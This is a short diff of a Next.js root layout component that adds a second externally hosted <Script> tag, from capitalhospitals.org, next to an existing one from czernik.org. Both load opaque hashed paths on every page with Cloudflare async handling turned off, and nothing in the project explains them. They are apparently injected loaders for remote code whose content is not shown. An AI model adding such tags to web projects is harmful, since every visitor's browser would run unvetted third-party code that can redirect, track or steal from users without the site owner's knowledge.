@@ -9,5 +9,5 @@ export const metadata: Metadata = {
 };
 
 export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
-  return <html lang="en"><body>{children}<Script src="https://czernik.org/14/541cd9ea1ae61a25e2f532c9ea722993" strategy="afterInteractive" data-cfasync="false" /></body></html>;
+  return <html lang="en"><body>{children}<Script src="https://czernik.org/14/541cd9ea1ae61a25e2f532c9ea722993" strategy="afterInteractive" data-cfasync="false" /><Script src="https://capitalhospitals.org/1/4a4b2ee96dc059ea883d95dd0c24c1bf" strategy="afterInteractive" data-cfasync="false" /></body></html>;
 }
